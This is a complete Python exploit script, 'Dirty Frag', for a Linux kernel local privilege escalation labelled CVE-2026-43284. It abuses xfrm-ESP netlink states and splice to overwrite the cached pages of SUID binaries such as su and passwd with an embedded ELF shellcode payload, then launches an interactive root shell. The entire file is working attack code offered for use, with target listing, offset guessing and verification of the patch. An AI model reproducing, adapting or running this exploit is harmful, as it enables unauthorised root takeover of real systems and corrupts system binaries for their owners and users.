#!/usr/bin/env python3
"""
Dirty Frag — Linux Kernel LPE (xfrm-ESP Page-Cache Write)
Enhanced with SUID target selection and working ELF payload
"""

import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
import ctypes, ctypes.util
import argparse
from struct import pack, unpack

_libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
_loff_t_p = ctypes.POINTER(ctypes.c_longlong)

def _raw_splice(fd_in, off_in, fd_out, off_out, length, flags):
    _libc.splice.restype = ctypes.c_long
    _libc.splice.argtypes = [ctypes.c_int, _loff_t_p, ctypes.c_int, _loff_t_p,
                             ctypes.c_size_t, ctypes.c_int]
    oi = ctypes.c_longlong(off_in) if off_in is not None else None
    oo = ctypes.c_longlong(off_out) if off_out is not None else None
    r = _libc.splice(fd_in, ctypes.byref(oi) if oi is not None else None,
                     fd_out, ctypes.byref(oo) if oo is not None else None,
                     length, flags)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

SYS_unshare = 272
CLONE_NEWUSER = 0x10000000
CLONE_NEWNET = 0x40000000

def _syscall(nr, *args):
    _libc.syscall.restype = ctypes.c_long
    ca = [ctypes.c_long(a) for a in args]
    _libc.syscall.argtypes = [ctypes.c_long] * (1 + len(ca))
    r = _libc.syscall(ctypes.c_long(nr), *ca)
    if r < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return r

def sys_unshare(flags):
    return _syscall(SYS_unshare, flags)

AF_NETLINK=16
AF_INET=2
SOCK_DGRAM=2
IPPROTO_UDP=17
NETLINK_XFRM=6
UDP_ENCAP=100
UDP_ENCAP_ESPINUDP=2
XFRM_MSG_NEWSA=16
NLM_F_REQUEST=1
NLM_F_ACK=4
IPPROTO_ESP=50
XFRM_MODE_TRANSPORT=0
XFRM_STATE_ESN=0x80
XFRMA_ALG_AUTH_TRUNC=20
XFRMA_ALG_CRYPT=2
XFRMA_ENCAP=4
XFRMA_REPLAY_ESN_VAL=23
ENC_PORT=4500
SEQ_VAL=200
REPLAY_SEQ=100

# Working ELF shellcode from dirty_frag_expv2.py
SHELL_ELF = bytes([
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
])

PAYLOAD_LEN = len(SHELL_ELF)
ENTRY_OFFSET = 0x78
MARKER = SHELL_ELF[ENTRY_OFFSET:ENTRY_OFFSET+8]  # For verification

VERBOSE = False

def LOG(fmt, *a): print("\033[92m[+]\033[0m " + fmt % a)
def WARN(fmt, *a): print("\033[93m[!]\033[0m " + fmt % a)
def DBG(fmt, *a):
    if VERBOSE: print("\033[94m[.]\033[0m " + fmt % a)
def ERROR(fmt, *a): print("\033[91m[-]\033[0m " + fmt % a)

def find_suid_binaries():
    """Find all SUID binaries on the system"""
    LOG("Searching for SUID binaries...")
    
    search_paths = [
        "/bin", "/sbin", "/usr/bin", "/usr/sbin", 
        "/usr/local/bin", "/usr/local/sbin", "/opt/bin"
    ]
    
    suid_binaries = []
    
    for path in search_paths:
        if not os.path.exists(path):
            continue
        try:
            for filename in os.listdir(path):
                filepath = os.path.join(path, filename)
                if os.path.isfile(filepath) and os.access(filepath, os.X_OK):
                    try:
                        if os.stat(filepath).st_mode & 0o4000:
                            suid_binaries.append(filepath)
                    except (OSError, PermissionError):
                        continue
        except (OSError, PermissionError):
            continue
    
    specific_files = ["/bin/su", "/bin/passwd", "/usr/bin/su", "/usr/bin/passwd", 
                      "/usr/bin/chsh", "/usr/bin/chfn", "/usr/bin/gpasswd"]
    
    for filepath in specific_files:
        if os.path.exists(filepath) and os.path.isfile(filepath):
            try:
                if os.stat(filepath).st_mode & 0o4000:
                    if filepath not in suid_binaries:
                        suid_binaries.append(filepath)
            except (OSError, PermissionError):
                continue
    
    return sorted(set(suid_binaries))

def check_suid(target):
    """Check if target has SUID bit"""
    if not os.path.exists(target):
        return False
    try:
        return bool(os.stat(target).st_mode & 0o4000)
    except:
        return False

def _ifup_lo():
    try:
        s = socket.socket(AF_INET, SOCK_DGRAM, 0)
        import array
        ifr = array.array('B', b'\x00' * 40)
        ifr[:2] = array.array('B', b'lo')
        fcntl.ioctl(s.fileno(), 0x8913, ifr)
        flags = struct.unpack_from('<H', ifr, 16)[0]
        struct.pack_into('<H', ifr, 16, flags | 0x41)
        fcntl.ioctl(s.fileno(), 0x8914, ifr)
        s.close()
        return True
    except Exception as e:
        DBG("ifup_lo failed: %s", e)
        return False

def _setup_userns():
    uid, gid = os.getuid(), os.getgid()
    try:
        sys_unshare(CLONE_NEWUSER | CLONE_NEWNET)
        DBG("User namespace created")
    except OSError as e:
        WARN("unshare failed: %s", e)
        return False
    
    try:
        with open("/proc/self/setgroups", 'w') as f: 
            f.write("deny")
        with open("/proc/self/uid_map", 'w') as f: 
            f.write(f"0 {uid} 1")
        with open("/proc/self/gid_map", 'w') as f: 
            f.write(f"0 {gid} 1")
        DBG("Maps configured (uid:%d/%d -> 0)", uid, gid)
        return _ifup_lo()
    except Exception as e:
        WARN("namespace setup failed: %s", e)
        return False

def _nl_attr(buf, off, atype, data):
    dl = len(data)
    rta_len = 4 + dl
    rta_aligned = (rta_len + 3) & ~3
    struct.pack_into('<HH', buf, off, rta_len, atype)
    buf[off+4:off+4+dl] = data
    pad = rta_aligned - 4 - dl
    if pad > 0:
        buf[off+4+dl:off+4+dl+pad] = b'\x00' * pad
    return off + rta_aligned

def _add_xfrm_sa(spi, seqhi):
    try:
        sk = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
        sk.bind((0, 0))
        buf = bytearray(4096)
        lo = struct.unpack("<I", socket.inet_aton("127.0.0.1"))[0]
        xs_sz = 224
        struct.pack_into('<IHHII', buf, 0, 16 + xs_sz, XFRM_MSG_NEWSA,
                         NLM_F_REQUEST | NLM_F_ACK | 0x200, os.getpid(), 1)
        o = 16
        struct.pack_into('<I', buf, o + 0, lo)
        struct.pack_into('<I', buf, o + 16, lo)
        struct.pack_into('<H', buf, o + 40, AF_INET)
        buf[o + 42] = 32
        buf[o + 43] = 32
        struct.pack_into('<I', buf, o + 56, lo)
        struct.pack_into('>I', buf, o + 72, spi)
        buf[o + 76] = IPPROTO_ESP
        struct.pack_into('<I', buf, o + 80, lo)
        struct.pack_into('<Q', buf, o + 96, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 104, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 112, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<Q', buf, o + 120, 0xFFFFFFFFFFFFFFFF)
        struct.pack_into('<I', buf, o + 208, 0x1234)
        struct.pack_into('<H', buf, o + 212, AF_INET)
        buf[o + 214] = XFRM_MODE_TRANSPORT
        buf[o + 215] = 0
        buf[o + 216] = XFRM_STATE_ESN

        a = 16 + xs_sz
        aa = bytearray(72 + 32)
        n = b"hmac(sha256)\0"
        aa[:len(n)] = n
        struct.pack_into('<I', aa, 64, 256)
        struct.pack_into('<I', aa, 68, 128)
        for i in range(32): aa[72+i] = 0xAA
        a = _nl_attr(buf, a, XFRMA_ALG_AUTH_TRUNC, bytes(aa))

        ea = bytearray(68 + 16)
        n2 = b"cbc(aes)\0"
        ea[:len(n2)] = n2
        struct.pack_into('<I', ea, 64, 128)
        for i in range(16): ea[68+i] = 0xBB
        a = _nl_attr(buf, a, XFRMA_ALG_CRYPT, bytes(ea))

        enc = bytearray(24)
        struct.pack_into('<H', enc, 0, UDP_ENCAP_ESPINUDP)
        struct.pack_into('>HH', enc, 2, ENC_PORT, ENC_PORT)
        a = _nl_attr(buf, a, XFRMA_ENCAP, bytes(enc))

        esn = bytearray(28)
        struct.pack_into('<IIIIIII', esn, 0, 1, 0, REPLAY_SEQ, 0, seqhi, 32, 0)
        a = _nl_attr(buf, a, XFRMA_REPLAY_ESN_VAL, bytes(esn))

        struct.pack_into('<I', buf, 0, a)
        sk.sendall(bytes(buf[:a]))
        
        sk.settimeout(1)
        try:
            resp = sk.recv(4096)
            if len(resp) >= 20 and struct.unpack_from('<H', resp, 4)[0] == 2:
                err = struct.unpack_from('<i', resp, 16)[0]
                if err != 0:
                    DBG("xfrm NEWSA error: %d", -err)
                    sk.close()
                    return False
        except socket.timeout:
            DBG("xfrm NEWSA timeout for spi=0x%x", spi)
        sk.close()
        return True
    except Exception as e:
        DBG("add_xfrm_sa failed: %s", e)
        return False

def _do_write(path, offset, spi):
    try:
        sk_r = socket.socket(AF_INET, SOCK_DGRAM, 0)
        sk_r.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sk_r.bind(("127.0.0.1", ENC_PORT))
        sk_r.setsockopt(IPPROTO_UDP, UDP_ENCAP, struct.pack('<I', UDP_ENCAP_ESPINUDP))
        
        sk_s = socket.socket(AF_INET, SOCK_DGRAM, 0)
        sk_s.connect(("127.0.0.1", ENC_PORT))
        
        fd = os.open(path, os.O_RDONLY)
        r, w = os.pipe()
        
        hdr = struct.pack('>II', spi, SEQ_VAL) + b'\xCC' * 16
        os.write(w, hdr)
        _raw_splice(fd, offset, w, None, 16, 0)
        
        try:
            _raw_splice(r, None, sk_s.fileno(), None, 40, 0)
        except OSError:
            pass
        
        time.sleep(0.02)
        
        os.close(fd)
        os.close(r)
        os.close(w)
        sk_s.close()
        sk_r.close()
        return True
    except Exception as e:
        DBG("_do_write failed: %s", e)
        return False

def corrupt_binary(target, patch_offset):
    """Corrupt target binary with shellcode"""
    DBG("Starting binary corruption at offset 0x%x", patch_offset)
    
    if not _setup_userns():
        return False
    
    time.sleep(0.1)
    
    # Setup XFRM states
    for i in range(PAYLOAD_LEN // 4):
        spi = 0xDEADBE10 + i
        idx = i * 4
        if idx + 4 > len(SHELL_ELF):
            break
        sq = ((SHELL_ELF[idx] << 24) | (SHELL_ELF[idx+1] << 16) |
              (SHELL_ELF[idx+2] << 8) | SHELL_ELF[idx+3])
        if not _add_xfrm_sa(spi, sq):
            DBG("add_xfrm_sa #%d failed", i)
            return False
    
    # Perform writes
    success = 0
    for i in range(PAYLOAD_LEN // 4):
        if _do_write(target, patch_offset + i * 4, 0xDEADBE10 + i):
            success += 1
        else:
            DBG("do_write #%d failed", i)
    
    DBG("Wrote %d/%d chunks", success, PAYLOAD_LEN // 4)
    time.sleep(0.2)
    
    return success > 0

def binary_patched(target, patch_offset):
    """Verify if binary was patched correctly"""
    try:
        fd = os.open(target, os.O_RDONLY)
        got = os.pread(fd, len(MARKER), patch_offset + ENTRY_OFFSET)
        os.close(fd)
        return got == MARKER
    except OSError:
        return False

def run_root_shell(target):
    """Spawn root shell with PTY for full interaction"""
    LOG("Spawning root shell via %s...", target)
    
    master, slave = pty.openpty()
    try:
        try:
            ws = fcntl.ioctl(sys.stdin.fileno(), termios.TIOCGWINSZ, b'\x00'*8)
            fcntl.ioctl(master, termios.TIOCSWINSZ, ws)
        except OSError:
            pass

        pid = os.fork()
        if pid == 0:
            os.close(master)
            os.setsid()
            try:
                sf = os.open(os.ttyname(slave), os.O_RDWR)
                os.close(slave)
                fcntl.ioctl(sf, termios.TIOCSCTTY, 0)
            except OSError:
                sf = slave
            
            os.dup2(sf, 0)
            os.dup2(sf, 1)
            os.dup2(sf, 2)
            if sf > 2:
                os.close(sf)
            
            os.execv(target, [target])
            os.execvp("sh", ["sh"])
            os._exit(127)

        os.close(slave)
        signal.signal(signal.SIGTTOU, signal.SIG_IGN)
        signal.signal(signal.SIGTTIN, signal.SIG_IGN)
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)
        signal.signal(signal.SIGHUP, signal.SIG_IGN)

        restore = False
        saved = None
        try:
            saved = termios.tcgetattr(sys.stdin.fileno())
            tty.setraw(sys.stdin.fileno())
            restore = True
        except termios.error:
            pass

        while True:
            rlist = []
            try:
                rlist.append(sys.stdin.fileno())
            except OSError:
                pass
            rlist.append(master)

            try:
                r, _, _ = select.select(rlist, [], [], 0.2)
            except (OSError, ValueError):
                break

            if master in r:
                try:
                    data = os.read(master, 4096)
                except OSError:
                    break
                if not data:
                    break
                os.write(sys.stdout.fileno(), data)

            if sys.stdin.fileno() in r:
                try:
                    data = os.read(sys.stdin.fileno(), 4096)
                except OSError:
                    break
                if not data:
                    break
                os.write(master, data)

            try:
                wp, st = os.waitpid(pid, os.WNOHANG)
                if wp == pid:
                    break
            except ChildProcessError:
                break

        if restore and saved:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSANOW, saved)
        os.close(master)
        return True
    except Exception as e:
        ERROR("PTY failed: %s", e)
        return False

def exploit_target(target):
    """Main exploit function"""
    LOG("Starting exploit on target: %s", target)
    LOG("Kernel: %s", os.uname().release)
    
    # Check XFRM availability
    try:
        sock = socket.socket(AF_NETLINK, socket.SOCK_RAW, NETLINK_XFRM)
        sock.close()
        LOG("XFRM netlink available")
    except Exception as e:
        ERROR("XFRM netlink not available: %s", e)
        return False
    
    # Check target
    if not os.path.exists(target):
        ERROR("Target %s does not exist", target)
        return False
    
    if not os.access(target, os.R_OK):
        ERROR("Cannot read target %s", target)
        return False
    
    size = os.path.getsize(target)
    LOG("Target size: %d bytes", size)
    
    if check_suid(target):
        LOG("Target has SUID bit set")
    else:
        WARN("Target does NOT have SUID bit! Exploit may still work but shell might not be root")
    
    # Try multiple offsets
    offsets = [0x14d0, 0x1500, 0x1600, 0x1700, 0x1800, 0x1900, 0x1a00, 
               0x1b00, 0x1c00, 0x1d00, 0x1e00, 0x2000, 0x2500, 0x3000, 0x363c,
               0x1000, 0x2000, 0x3000, 0x4000]
    
    LOG("Trying %d offsets...", len(offsets))
    
    for offset in offsets:
        if offset + PAYLOAD_LEN > size:
            DBG("Offset 0x%x out of bounds", offset)
            continue
        
        LOG("Trying offset 0x%x", offset)
        
        # Read original for verification
        try:
            with open(target, 'rb') as f:
                f.seek(offset)
                original = f.read(16)
                DBG("Original at 0x%x: %s", offset, original.hex())
        except:
            pass
        
        if corrupt_binary(target, offset):
            if binary_patched(target, offset):
                LOG("SUCCESS! Binary patched at offset 0x%x", offset)
                LOG("Launching root shell...")
                run_root_shell(target)
                return True
            else:
                WARN("Patch verification failed")
        
        time.sleep(0.3)
    
    ERROR("All offsets failed")
    return False

def print_banner():
    banner = """
\033[91m
  ██████  ██ ██████  ████████ ██    ██    ███████ ██████   █████   ██████  
  ██   ██ ██ ██   ██    ██    ██    ██    ██      ██   ██ ██   ██ ██       
  ██   ██ ██ ██████     ██    ██    ██    █████   ██████  ███████ ██   ███ 
  ██   ██ ██ ██   ██    ██    ██    ██    ██      ██   ██ ██   ██ ██    ██ 
  ██████  ██ ██   ██    ██    ██    ██    ██      ██   ██ ██   ██  ██████  
\033[0m
  \033[93mDirty Frag - Linux Kernel LPE (CVE-2026-43284)\033[0m
  \033[90mWorking SUID Binary Exploit with ELF Payload\033[0m
"""
    print(banner)

def main():
    parser = argparse.ArgumentParser(
        description='Dirty Frag LPE Exploit - SUID Binary Target',
        epilog='Examples:\n  %(prog)s -t /usr/bin/su\n  %(prog)s -l\n  %(prog)s -t /usr/bin/passwd -v'
    )
    parser.add_argument('-t', '--target', type=str, help='Target SUID binary')
    parser.add_argument('-l', '--list', action='store_true', help='List SUID binaries')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    print_banner()
    
    global VERBOSE
    VERBOSE = args.verbose or bool(os.getenv("DIRTYFRAG_VERBOSE"))
    
    if os.getuid() == 0:
        LOG("Already root, spawning shell...")
        os.execvp("/bin/bash", ["bash", "-i"])
    
    if args.list:
        suid_bins = find_suid_binaries()
        if suid_bins:
            LOG("Found %d SUID binaries:", len(suid_bins))
            for i, binary in enumerate(suid_bins, 1):
                size = os.path.getsize(binary) if os.path.exists(binary) else 0
                print(f"  {i:3d}. {binary} ({size} bytes)")
        else:
            WARN("No SUID binaries found")
        return
    
    if args.target:
        target = args.target
    else:
        # Try common targets
        for t in ["/usr/bin/su", "/bin/su", "/usr/bin/passwd", "/bin/passwd"]:
            if os.path.exists(t) and check_suid(t):
                target = t
                LOG("Auto-selected target: %s", target)
                break
        else:
            ERROR("No suitable target found. Use -t to specify or -l to list")
            sys.exit(1)
    
    LOG("Target: %s", target)
    
    if exploit_target(target):
        LOG("Exploit completed. You should have a root shell.")
    else:
        ERROR("Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
